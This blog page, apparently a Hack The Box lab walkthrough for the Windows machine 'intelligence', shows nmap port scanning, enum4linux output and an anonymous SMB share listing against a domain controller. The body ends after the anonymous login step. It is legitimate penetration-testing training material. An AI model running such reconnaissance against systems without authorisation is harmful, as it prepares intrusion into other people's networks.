<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 WindowsDifficulty:	MediumPoints:	30Release:	03 Jul 2021IP:	10.10.10.248">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[intelligence]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/07/10/intelligence/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	MediumPoints:	30Release:	03 Jul 2021IP:	10.10.10.248">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2012.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2013.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2014.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2015.jpg">
<meta property="article:published_time" content="2021-07-10T03:31:58.000Z">
<meta property="article:modified_time" content="2021-11-28T07:20:05.925Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2012.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/07/10/intelligence/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/07/10/intelligence/","path":"2021/07/10/intelligence/","title":"Hack-The-Box-walkthrough[intelligence]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[intelligence] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">209</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-number">3.</span> <span class="nav-text">SMB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Enum4linux"><span class="nav-number">3.1.</span> <span class="nav-text">Enum4linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Anonymous-Login"><span class="nav-number">3.2.</span> <span class="nav-text">Anonymous Login</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP"><span class="nav-number">4.</span> <span class="nav-text">LDAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">5.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos"><span class="nav-number">6.</span> <span class="nav-text">Kerberos</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-1"><span class="nav-number">7.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crackmapexec"><span class="nav-number">8.</span> <span class="nav-text">Crackmapexec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smbmap"><span class="nav-number">9.</span> <span class="nav-text">smbmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-txt"><span class="nav-number">10.</span> <span class="nav-text">User.txt</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC"><span class="nav-number"></span> <span class="nav-text">PrivESC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">1.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">1.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">209</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/07/10/intelligence/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[intelligence] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[intelligence]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-10 11:31:58" itemprop="dateCreated datePublished" datetime="2021-07-10T11:31:58+08:00">2021-07-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-11-28 15:20:05" itemprop="dateModified" datetime="2021-11-28T15:20:05+08:00">2021-11-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>4.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>17 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>OS:	 Windows<br>Difficulty:	Medium<br>Points:	30<br>Release:	03 Jul 2021<br>IP:	10.10.10.248</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2012.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.248</span></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-10 10:05:43Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49686/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49702/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49708/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">64420/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>Looks like a normal Active Directory setup for windows OS.</p>
<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul  4 07:18:41 2021</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... intelligence.htb</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on intelligence.htb    |</span><br><span class="line"> ======================================================== </span><br><span class="line">[E] Can<span class="string">&#x27;t find workgroup/domain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ================================================ </span></span><br><span class="line"><span class="string">|    Nbtstat Information for intelligence.htb    |</span></span><br><span class="line"><span class="string"> ================================================ </span></span><br><span class="line"><span class="string">Looking up status of 10.129.80.199</span></span><br><span class="line"><span class="string">No reply from 10.129.80.199</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">|    Session Check on intelligence.htb    |</span></span><br><span class="line"><span class="string"> ========================================= </span></span><br><span class="line"><span class="string">[+] Server intelligence.htb allows sessions using username &#x27;</span><span class="string">&#x27;, password &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] Got domain/workgroup name: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =============================================== </span></span><br><span class="line"><span class="string">|    Getting domain SID for intelligence.htb    |</span></span><br><span class="line"><span class="string"> =============================================== </span></span><br><span class="line"><span class="string">Domain Name: intelligence</span></span><br><span class="line"><span class="string">Domain Sid: S-1-5-21-4210132550-3389855604-3437519686</span></span><br><span class="line"><span class="string">[+] Host is part of a domain (not a workgroup)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ========================================== </span></span><br><span class="line"><span class="string">|    OS information on intelligence.htb    |</span></span><br><span class="line"><span class="string"> ========================================== </span></span><br><span class="line"><span class="string">[+] Got OS info for intelligence.htb from smbclient: </span></span><br><span class="line"><span class="string">[+] Got OS info for intelligence.htb from srvinfo:</span></span><br><span class="line"><span class="string">Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ================================= </span></span><br><span class="line"><span class="string">|    Users on intelligence.htb    |</span></span><br><span class="line"><span class="string"> ================================= </span></span><br><span class="line"><span class="string">[E] Couldn&#x27;</span>t find <span class="built_in">users</span> using querydispinfo: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">[E] Couldn<span class="string">&#x27;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string">|    Share Enumeration on intelligence.htb    |</span></span><br><span class="line"><span class="string"> ============================================= </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	Sharename       Type      Comment</span></span><br><span class="line"><span class="string">	---------       ----      -------</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attempting to map shares on intelligence.htb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ======================================================== </span></span><br><span class="line"><span class="string">|    Password Policy Information for intelligence.htb    |</span></span><br><span class="line"><span class="string"> ======================================================== </span></span><br><span class="line"><span class="string">[E] Unexpected error from polenum:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Attaching to intelligence.htb using a NULL share</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 139/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	[!] Protocol failed: Cannot request session (Called Name:INTELLIGENCE.HT)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Trying protocol 445/SMB...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[E] Failed to get password policy with rpcclient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> ================================== </span></span><br><span class="line"><span class="string">|    Groups on intelligence.htb    |</span></span><br><span class="line"><span class="string"> ================================== </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting builtin group memberships:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting local group memberships:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain groups:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Getting domain group memberships:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> =========================================================================== </span></span><br><span class="line"><span class="string">|    Users on intelligence.htb via RID cycling (RIDS: 500-550,1000-1050)    |</span></span><br><span class="line"><span class="string"> =========================================================================== </span></span><br><span class="line"><span class="string">[E] Couldn&#x27;</span>t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.</span><br><span class="line"></span><br><span class="line"> ================================================= </span><br><span class="line">|    Getting printer info <span class="keyword">for</span> intelligence.htb    |</span><br><span class="line"> ================================================= </span><br><span class="line">Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Sun Jul  4 07:19:54 2021</span><br></pre></td></tr></table></figure>

<p>Nothing much from here so let’s try anonymous login.</p>
<h3 id="Anonymous-Login"><a href="#Anonymous-Login" class="headerlink" title="Anonymous Login"></a>Anonymous Login</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># smbclient -L //intelligence.htb</span></span><br><span class="line">Enter WORKGROUP\root<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Anonymous login successful</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Sharename       Type      Comment</span></span><br><span class="line"><span class="string">        ---------       ----      -------</span></span><br><span class="line"><span class="string">SMB1 disabled -- no workgroup available</span></span><br></pre></td></tr></table></figure>

